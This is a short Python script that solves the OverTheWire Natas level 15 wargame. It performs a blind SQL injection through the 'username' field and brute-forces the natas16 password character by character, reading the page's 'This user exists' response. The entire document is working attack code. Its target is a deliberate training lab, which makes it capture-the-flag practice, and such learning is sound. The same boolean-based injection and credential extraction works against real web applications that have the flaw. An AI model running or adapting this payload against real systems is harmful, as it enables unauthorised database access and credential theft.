import requests

# Constants
BASE_URL = "http://natas15.natas.labs.overthewire.org/"
BASE_USERNAME = "natas15"
BASE_PASSWORD = "Use your own"
CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
PASSWORD_LENGTH = 32

# Initialize the password to an empty string
password = ""

while len(password) < PASSWORD_LENGTH:
    for char in CHARSET:
        print(f'trying {char}')
        
        # Construct the payload for the SQL injection
        payload = {
            "username": f'natas16" AND BINARY password LIKE "{password}{char}%%" # '
        }
        
        # Send the request
        response = requests.post(BASE_URL, data=payload, auth=(BASE_USERNAME, BASE_PASSWORD))
        content = response.text
        
        # Check the response
        if 'This user exists' in content:
            password += char
            print(f'Password so far: {password}')
            break

print(f'Final password: {password}')